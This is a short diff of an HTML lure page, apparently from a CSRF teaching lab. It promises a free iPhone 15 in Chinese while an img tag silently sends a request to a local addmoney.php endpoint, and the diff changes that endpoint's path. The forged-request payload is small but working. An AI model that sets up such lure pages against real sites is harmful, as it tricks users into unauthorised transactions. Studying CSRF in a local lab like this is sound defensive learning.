@@ -8,7 +8,9 @@
     <h1>🔥 恭喜你獲得免費 iPhone 15！</h1>
     <p>正在為您處理中...</p>
 
-    <img src="http://localhost:8080/csrf_lax/addmoney.php" width="0" height="0" style="display:none;" alt="attack">
+    <img src="http://localhost:8080/csrf/addmoney.php" 
+    
+     alt="attack">
 
     <script>
         // 為了方便觀察，我們延遲一點時間後告訴你發生了什麼事
